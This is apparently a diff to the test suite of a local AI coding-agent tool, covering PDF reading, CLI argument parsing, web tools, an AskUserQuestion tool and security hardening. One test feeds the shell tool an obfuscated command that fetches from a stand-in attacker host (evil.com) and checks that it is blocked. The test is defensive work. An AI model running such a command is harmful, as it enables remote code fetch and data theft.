@@ -1228,7 +1228,7 @@ class TestToolRegistry:
     def test_get_schemas(self):
         registry = vc.ToolRegistry().register_defaults()
         schemas = registry.get_schemas()
-        assert len(schemas) == 13  # 9 base + 4 task tools
+        assert len(schemas) == 14  # 9 base + 4 task tools + AskUserQuestion
         for s in schemas:
             assert s["type"] == "function"
             assert "function" in s
@@ -3796,14 +3796,14 @@ class TestReadToolPDFDetection:
     def setup_method(self):
         self.tool = vc.ReadTool()
 
-    def test_pdf_returns_not_supported(self):
-        """PDF files should return a 'not supported' message."""
+    def test_pdf_no_extractable_text(self):
+        """PDF with no text streams should return appropriate message."""
         data = b'%PDF-1.4 ' + b'\x00' * 100
         with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
             f.write(data)
         try:
             result = self.tool.execute({"file_path": f.name})
-            assert "not supported" in result.lower()
+            assert "no extractable text" in result.lower() or "page" in result.lower()
         finally:
             os.unlink(f.name)
 
@@ -3814,7 +3814,7 @@ class TestReadToolPDFDetection:
             f.write(data)
         try:
             result = self.tool.execute({"file_path": f.name})
-            assert "not supported" in result.lower()
+            assert "no extractable text" in result.lower() or "page" in result.lower()
         finally:
             os.unlink(f.name)
 
@@ -4747,7 +4747,7 @@ class TestTokenUsageDisplay:
 
     def test_version_bump(self):
         """Verify version was bumped for this feature release."""
-        assert vc.__version__ == "0.8.0"
+        assert vc.__version__ == "0.9.0"
 
     def test_bash_tool_has_run_in_background_param(self):
         tool = vc.BashTool()
@@ -5688,9 +5688,423 @@ class TestRound10AuditFixes:
 
     def test_cli_fullwidth_space_handling(self):
         """CLI should handle full-width spaces in arguments."""
-        config = vc.Config.__new__(vc.Config)
         # Simulate: python3 vibe-coder.py -y\u3000 (full-width space after -y)
-        # The fix preprocesses argv to strip full-width spaces
+        config = vc.Config.__new__(vc.Config)
+        config.prompt = None
+        config.model = ""
+        config.yes_mode = False
+        config.debug = False
+        config.resume = False
+        config.session_id = None
+        config.list_sessions = False
+        config.ollama_host = ""
+        config.max_tokens = 8192
+        config.temperature = 0.7
+        config.context_window = 32768
+        # -y with trailing full-width space should parse cleanly
+        config._load_cli_args(['-y\u3000'])
+        assert config.yes_mode is True, "Full-width space after -y should still set yes_mode"
+
+    def test_cli_fullwidth_space_splits_joined_args(self):
+        """Full-width space between flag and value should split correctly."""
+        config = vc.Config.__new__(vc.Config)
+        config.prompt = None
+        config.model = ""
+        config.yes_mode = False
+        config.debug = False
+        config.resume = False
+        config.session_id = None
+        config.list_sessions = False
+        config.ollama_host = ""
+        config.max_tokens = 8192
+        config.temperature = 0.7
+        config.context_window = 32768
+        # --model\u3000qwen3:8b as single arg (shell doesn't split on full-width space)
+        config._load_cli_args(['--model\u3000qwen3:8b'])
+        assert config.model == "qwen3:8b", "Full-width space between --model and value should split"
+
+
+class TestWebToolsAuditFixes:
+    """Tests for web tools audit fixes (Chrome UA, DDG class matching, timeout)."""
+
+    def test_chrome_ua_updated(self):
+        """Chrome UA string should be v133+, not v120."""
         import inspect
-        source = inspect.getsource(vc.Config._load_cli_args)
-        assert "\\u3000" in source or "\u3000" in source, "Should handle full-width spaces"
+        fetch_source = inspect.getsource(vc.WebFetchTool.execute)
+        assert "Chrome/120" not in fetch_source, "WebFetch UA should be updated from Chrome/120"
+        assert "Chrome/133" in fetch_source, "WebFetch UA should use Chrome/133"
+        search_source = inspect.getsource(vc.WebSearchTool._ddg_search)
+        assert "Chrome/120" not in search_source, "WebSearch UA should be updated from Chrome/120"
+        assert "Chrome/133" in search_source, "WebSearch UA should use Chrome/133"
+
+    def test_ddg_class_regex_flexible(self):
+        """DDG result__a regex should match multi-class attributes."""
+        import inspect
+        source = inspect.getsource(vc.WebSearchTool._ddg_search)
+        # Should use [^"]* around result__a to match class="result__a result__link"
+        assert 'result__a[^"]*"' in source, "result__a regex should be flexible for multi-class"
+        assert 'result__snippet[^"]*"' in source, "result__snippet regex should be flexible for multi-class"
+
+    def test_ddg_link_regex_matches_multiclass(self):
+        """DDG link regex should extract URL from multi-class anchor tags."""
+        import re
+        # Use the same pattern as production code
+        link_pat = re.compile(
+            r'<a\s+[^>]*(?:class="[^"]*result__a[^"]*"[^>]*href="([^"]*)"'
+            r'|href="([^"]*)"[^>]*class="[^"]*result__a[^"]*")[^>]*>(.*?)</a>',
+            re.DOTALL,
+        )
+        # Test single class (class before href)
+        html1 = '<a class="result__a" href="https://example.com">Title</a>'
+        m1 = link_pat.search(html1)
+        assert m1 and (m1.group(1) or m1.group(2)) == "https://example.com"
+        # Test multi-class (class before href)
+        html2 = '<a class="result__a result__link" href="https://example.com">Title</a>'
+        m2 = link_pat.search(html2)
+        assert m2 and (m2.group(1) or m2.group(2)) == "https://example.com"
+        # Test href before class (reverse attribute order)
+        html3 = '<a href="https://example.com" class="result__a">Title</a>'
+        m3 = link_pat.search(html3)
+        assert m3 and (m3.group(1) or m3.group(2)) == "https://example.com"
+
+    def test_websearch_timeout_30s(self):
+        """WebSearch timeout should be 30s to match WebFetch."""
+        import inspect
+        source = inspect.getsource(vc.WebSearchTool._ddg_search)
+        assert "timeout=30" in source, "WebSearch should use 30s timeout"
+        assert "timeout=15" not in source, "WebSearch should not use 15s timeout"
+
+    def test_webfetch_charset_detection(self):
+        """WebFetchTool should parse charset from Content-Type header."""
+        import inspect
+        source = inspect.getsource(vc.WebFetchTool.execute)
+        assert "charset" in source, "Should detect charset from Content-Type"
+        assert "LookupError" in source, "Should handle unknown charsets gracefully"
+
+    def test_check_model_strips_whitespace(self):
+        """check_model should strip whitespace from model names for robustness."""
+        import inspect
+        source = inspect.getsource(vc.OllamaClient.check_model)
+        assert ".strip()" in source, "Should strip whitespace from model names"
+
+    def test_fullwidth_space_resplits_joined_args(self):
+        """Full-width space between flag and value should split into separate args."""
+        config = vc.Config.__new__(vc.Config)
+        config.prompt = None
+        config.model = ""
+        config.yes_mode = False
+        config.debug = False
+        config.resume = False
+        config.session_id = None
+        config.list_sessions = False
+        config.ollama_host = ""
+        config.max_tokens = 8192
+        config.temperature = 0.7
+        config.context_window = 32768
+        # Pure full-width space arg should be dropped (empty after split)
+        config._load_cli_args(['\u3000', '--debug'])
+        assert config.debug is True
+
+
+class TestRound11SecurityFixes:
+    """Tests for Round 11 security, robustness, and reliability fixes."""
+
+    def test_writetool_undo_does_not_overwrite_content(self, tmp_path):
+        """C1: WriteTool undo backup must not overwrite new content variable."""
+        # Create an existing file
+        f = tmp_path / "existing.txt"
+        f.write_text("old content", encoding="utf-8")
+        # Write new content
+        tool = vc.WriteTool()
+        result = tool.execute({"file_path": str(f), "content": "new content"})
+        assert "Error" not in result
+        # Verify the new content was written, not the old content
+        assert f.read_text(encoding="utf-8") == "new content"
+
+    def test_writetool_undo_preserves_old_content_in_stack(self, tmp_path):
+        """C1: Undo stack should contain the old content, not the new content."""
+        f = tmp_path / "undo_test.txt"
+        f.write_text("original", encoding="utf-8")
+        vc._undo_stack.clear()
+        tool = vc.WriteTool()
+        tool.execute({"file_path": str(f), "content": "updated"})
+        assert len(vc._undo_stack) > 0
+        path, old_content = vc._undo_stack[-1]
+        assert old_content == "original"
+
+    def test_subagent_has_permissions_param(self):
+        """C2: SubAgent constructor should accept permissions parameter."""
+        import inspect
+        sig = inspect.signature(vc.SubAgentTool.__init__)
+        assert "permissions" in sig.parameters
+
+    def test_subagent_permission_check_in_execute(self):
+        """C2: SubAgent execute should check permissions for write tools."""
+        import inspect
+        source = inspect.getsource(vc.SubAgentTool.execute)
+        assert "_permissions" in source, "SubAgent should reference permission manager"
+        assert "WRITE_TOOLS" in source, "SubAgent should check write tools against permissions"
+
+    def test_results_initialized_before_phase1_usage(self):
+        """H-R2: results must be initialized before it's used in Phase 1 JSON error handling."""
+        import inspect
+        source = inspect.getsource(vc.Agent.run)
+        # Find where results.append is first used (in JSON error handler)
+        first_append = source.find("results.append(ToolResult")
+        # Find where results = [] is initialized
+        results_init = source.find("results = []")
+        assert results_init < first_append, "results = [] must be before first results.append()"
+
+    def test_bg_bash_uses_clean_env(self):
+        """H1: Background Bash should use sanitized environment."""
+        import inspect
+        source = inspect.getsource(vc.BashTool.execute)
+        # The background path should reference clean env
+        bg_section = source[source.find("run_in_background"):]
+        assert "clean_env" in bg_section or "_build_clean_env" in bg_section
+
+    def test_build_clean_env_strips_secrets(self):
+        """H1: _build_clean_env should strip sensitive env vars."""
+        import os
+        tool = vc.BashTool()
+        old_env = os.environ.copy()
+        try:
+            os.environ["GITHUB_TOKEN_TEST"] = "secret123"
+            os.environ["AWS_SECRET_KEY"] = "secret456"
+            os.environ["PATH"] = "/usr/bin"
+            clean = tool._build_clean_env()
+            assert "PATH" in clean
+            assert "GITHUB_TOKEN_TEST" not in clean
+            assert "AWS_SECRET_KEY" not in clean
+        finally:
+            os.environ.clear()
+            os.environ.update(old_env)
+
+    def test_dangerous_patterns_before_bg(self):
+        """H1: Dangerous pattern checks should run before background branch."""
+        import inspect
+        source = inspect.getsource(vc.BashTool.execute)
+        bg_idx = source.find("run_in_background")
+        danger_idx = source.find("_DANGEROUS_PATTERNS")
+        assert danger_idx < bg_idx, "Dangerous patterns check must precede background branch"
+
+    def test_task_store_lock_exists(self):
+        """H3: Task store should have a threading lock."""
+        assert hasattr(vc, '_task_store_lock')
+        import threading
+        assert isinstance(vc._task_store_lock, type(threading.Lock()))
+
+    def test_task_create_uses_lock(self):
+        """H3: TaskCreateTool should use lock."""
+        import inspect
+        source = inspect.getsource(vc.TaskCreateTool.execute)
+        assert "_task_store_lock" in source
+
+    def test_protected_path_covers_config_dir(self):
+        """M1: _is_protected_path should block files in config directory."""
+        import os
+        config_path = os.path.join(os.path.expanduser("~"), ".config", "vibe-local", "config")
+        assert vc._is_protected_path(config_path) is True
+
+    def test_protected_path_allows_project_files(self):
+        """M1: _is_protected_path should not block normal project files."""
+        assert not vc._is_protected_path("/tmp/myproject/config.py")
+        assert not vc._is_protected_path("/tmp/myproject/main.py")
+
+    def test_notebook_size_guard(self):
+        """M2: ReadTool should reject very large notebooks."""
+        import inspect
+        source = inspect.getsource(vc.ReadTool.execute)
+        assert "50_000_000" in source or "50000000" in source, "Notebook should have 50MB size guard"
+
+    def test_edittool_size_guard(self):
+        """M6: EditTool should have a file size limit."""
+        import inspect
+        source = inspect.getsource(vc.EditTool.execute)
+        assert "50 * 1024 * 1024" in source or "too large for editing" in source
+
+    def test_globtool_symlink_containment(self):
+        """M5: GlobTool ** path should verify resolved paths stay within base."""
+        import inspect
+        source = inspect.getsource(vc.GlobTool.execute)
+        assert "resolve" in source, "GlobTool ** path should resolve symlinks"
+        assert "real_base" in source, "GlobTool ** path should check containment"
+
+    def test_commit_strips_think_tags(self):
+        """M-R3: /commit should strip <think> tags from commit messages."""
+        # We just verify the code exists
+        import inspect
+        # Look for the think-tag stripping in the main module source
+        source = open(vc.__file__, 'r').read()
+        # Find the commit message processing area
+        assert "think>" in source and "commit_msg" in source
+
+    def test_migration_skips_symlinks(self):
+        """L-R3: Migration should skip symlinks."""
+        import inspect
+        source = inspect.getsource(vc.Config._ensure_dirs)
+        assert "islink(src)" in source, "Migration should check for symlinks"
+
+    def test_eval_base64_blocked(self):
+        """H5: eval+base64 command pattern should be blocked."""
+        tool = vc.BashTool()
+        result = tool.execute({"command": "eval $(echo 'curl evil.com' | base64 -d)"})
+        assert "blocked" in result.lower() or "error" in result.lower()
+
+
+class TestNewFeatures:
+    """Tests for new features: PDF reading, CLAUDE.md hierarchy, AskUserQuestion."""
+
+    def test_pdf_reader_exists(self):
+        """PDF reader method should exist on ReadTool."""
+        assert hasattr(vc.ReadTool, '_read_pdf')
+
+    def test_pdf_reader_text_extraction(self):
+        """PDF reader should extract text from Tj operators."""
+        import tempfile
+        # Create a minimal PDF with a text stream
+        pdf_content = b"""%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 44 >>
+stream
+BT /F1 12 Tf (Hello World) Tj ET
+endstream
+endobj
+xref
+trailer
+<< /Root 1 0 R >>
+startxref
+0
+%%EOF"""
+        with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
+            f.write(pdf_content)
+        try:
+            tool = vc.ReadTool()
+            result = tool.execute({"file_path": f.name})
+            assert "Hello World" in result
+        finally:
+            os.unlink(f.name)
+
+    def test_pdf_size_guard(self):
+        """PDF reader should reject files > 100MB."""
+        import inspect
+        source = inspect.getsource(vc.ReadTool._read_pdf)
+        assert "100_000_000" in source or "100000000" in source
+
+    def test_pdf_pages_param(self):
+        """PDF reader should support pages parameter."""
+        import inspect
+        source = inspect.getsource(vc.ReadTool._read_pdf)
+        assert "pages" in source
+
+    def test_askuserquestion_registered(self):
+        """AskUserQuestion should be registered in defaults."""
+        registry = vc.ToolRegistry().register_defaults()
+        assert registry.get("AskUserQuestion") is not None
+
+    def test_askuserquestion_in_safe_tools(self):
+        """AskUserQuestion should be in SAFE_TOOLS (no confirmation needed)."""
+        assert "AskUserQuestion" in vc.PermissionMgr.SAFE_TOOLS
+
+    def test_askuserquestion_empty_question(self):
+        """AskUserQuestion should reject empty questions."""
+        tool = vc.AskUserQuestionTool()
+        result = tool.execute({"question": ""})
+        assert "error" in result.lower()
+
+    def test_askuserquestion_schema(self):
+        """AskUserQuestion should have proper schema."""
+        tool = vc.AskUserQuestionTool()
+        schema = tool.get_schema()
+        assert schema["function"]["name"] == "AskUserQuestion"
+        params = schema["function"]["parameters"]
+        assert "question" in params["properties"]
+        assert "options" in params["properties"]
+
+    def test_claudemd_hierarchy_searches_parents(self):
+        """CLAUDE.md loading should search parent directories."""
+        import inspect
+        source = inspect.getsource(vc._build_system_prompt)
+        # Should walk up directories
+        assert "parent" in source.lower() or "dirname" in source
+        # Should load global config
+        assert "Global Instructions" in source or "global_md" in source
+
+    def test_claudemd_sanitizes_instructions(self):
+        """CLAUDE.md loading should sanitize tool-call XML."""
+        import inspect
+        source = inspect.getsource(vc._build_system_prompt)
+        assert "BLOCKED" in source
+        assert "invoke" in source  # sanitizes <invoke> tags
+
+    def test_task_tools_in_safe(self):
+        """Task tools should be in SAFE_TOOLS."""
+        for tool in ["TaskCreate", "TaskList", "TaskGet", "TaskUpdate"]:
+            assert tool in vc.PermissionMgr.SAFE_TOOLS
+
+
+class TestBeginnerUXImprovements:
+    """Tests for beginner UX improvements."""
+
+    def test_permission_prompt_shows_tool_name(self):
+        """Permission prompt should show which tool is being asked about."""
+        import inspect
+        source = inspect.getsource(vc.TUI.ask_permission)
+        # Should include tool_name in the option text
+        assert "Allow all" in source or "Allow once" in source
+
+    def test_greeting_rule_in_system_prompt(self):
+        """System prompt should handle greetings without tool calls."""
+        cfg = vc.Config()
+        cfg.cwd = os.getcwd()
+        prompt = vc._build_system_prompt(cfg)
+        assert "greeting" in prompt.lower() or "hello" in prompt.lower()
+
+    def test_ollama_macos_message(self):
+        """On macOS, Ollama error should mention menu bar, not 'ollama serve'."""
+        import inspect
+        source = inspect.getsource(vc.main)
+        assert "menu bar" in source
+
+    def test_ctrlc_hint_visible_color(self):
+        """Ctrl+C hint should use a visible color, not DIM."""
+        import inspect
+        source = inspect.getsource(vc.TUI.banner)
+        # Should use a lighter color (250) instead of DIM
+        assert "250m" in source or "interrupt" in source.lower()
+
+    def test_system_prompt_no_tool_for_factual(self):
+        """System prompt should have rule about not using tools for factual questions."""
+        cfg = vc.Config()
+        cfg.cwd = os.getcwd()
+        prompt = vc._build_system_prompt(cfg)
+        assert "factual" in prompt.lower() or "conceptual" in prompt.lower()
+
+    def test_system_prompt_multi_step(self):
+        """System prompt should instruct multi-step sequential execution."""
+        cfg = vc.Config()
+        cfg.cwd = os.getcwd()
+        prompt = vc._build_system_prompt(cfg)
+        assert "multi-step" in prompt.lower() or "sequence" in prompt.lower()
+
+    def test_system_prompt_think_tag_directive(self):
+        """System prompt should instruct model not to output think tags."""
+        cfg = vc.Config()
+        cfg.cwd = os.getcwd()
+        prompt = vc._build_system_prompt(cfg)
+        assert "<think>" in prompt
+
+    def test_truncation_notice_in_loader(self):
+        """CLAUDE.md loader should add truncation notice for large files."""
+        import inspect
+        source = inspect.getsource(vc._build_system_prompt)
+        assert "truncat" in source.lower()
